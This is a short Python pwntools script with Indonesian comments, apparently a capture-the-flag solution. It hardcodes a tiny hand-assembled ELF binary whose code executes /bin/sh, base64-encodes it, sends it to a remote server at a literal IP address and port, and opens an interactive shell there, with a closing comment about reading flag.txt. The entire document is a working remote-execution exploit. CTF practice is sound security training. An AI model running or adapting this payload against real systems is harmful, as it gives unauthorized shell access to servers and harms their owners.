
from pwn import *
import base64

# Skrip ini dimodifikasi agar kompatibel dengan Windows.
# Fungsi `asm()` dari pwntools memerlukan assembler (seperti NASM) yang tidak ada di Windows.
# Oleh karena itu, shellcode ELF telah di-assemble sebelumnya dan di-hardcode di bawah ini.
# Dengan begitu, skrip ini hanya melakukan koneksi jaringan dan encoding, yang bisa berjalan di semua OS.

# Ini adalah hasil kompilasi dari shellcode assembly, dalam bentuk bytes.
# Ukurannya 72 byte, memenuhi syarat <= 76 byte.
elf_binary = (
    b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    b'\x02\x00>\x00\x01\x00\x00\x00H\x00\x00\x00\x00\x00\x00\x00'
    b'(\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    b'(\x008\x00\x01\x00\x00\x00\x01\x00\x00\x00\x05\x00\x00\x00'
    b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    b'\x00\x00\x00\x00H\x00\x00\x00\x00\x00\x00\x00H\x00\x00\x00'
    b'\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00H\xb8/bin/sh\x00'
    b'PH\x89\xe71\xf61\xd2\xb0;\x0f\x05'
)

# --- Verifikasi (Langkah yang baik) ---
# Periksa apakah 4 byte pertama sudah benar
assert elf_binary[:4] == b'\x7fELF'
# Periksa apakah ukurannya sesuai batasan
assert len(elf_binary) <= 76
print(f"[*] Binary ELF yang dihasilkan berukuran {len(elf_binary)} bytes. (Batasan: <= 76)")

# Encode payload binary ke Base64
encoded_payload = base64.b64encode(elf_binary)
print(f"[*] Payload Base64 sudah siap.")

# --- Koneksi dan Eksploitasi ---
# Definisikan host dan port remote
HOST = "117.53.46.98"
PORT = 12000

# Sambungkan ke server remote
try:
    p = remote(HOST, PORT)

    # Terima prompt dari server
    prompt = p.recvuntil(b"? ")
    print(f"[*] Menerima prompt: {prompt.decode()}")

    # Kirim payload yang sudah di-encode
    p.sendline(encoded_payload)
    print("[*] Payload terkirim.")

    # Server sekarang seharusnya menjalankan shellcode kita.
    # Kita masuk ke sesi interaktif untuk menggunakan shell.
    print("[*] Berhasil! Masuk ke shell interaktif...")
    p.interactive()

except Exception as e:
    print(f"\n[!] Terjadi kesalahan: {e}")
    print("[!] Pastikan Anda sudah menginstall pwntools: 'pip install pwntools'")
    print("[!] Pastikan juga koneksi internet Anda stabil dan bisa menjangkau server.")

# Setelah mendapatkan shell, Anda bisa mengetikkan perintah seperti 'ls -la' dan 'cat flag.txt'

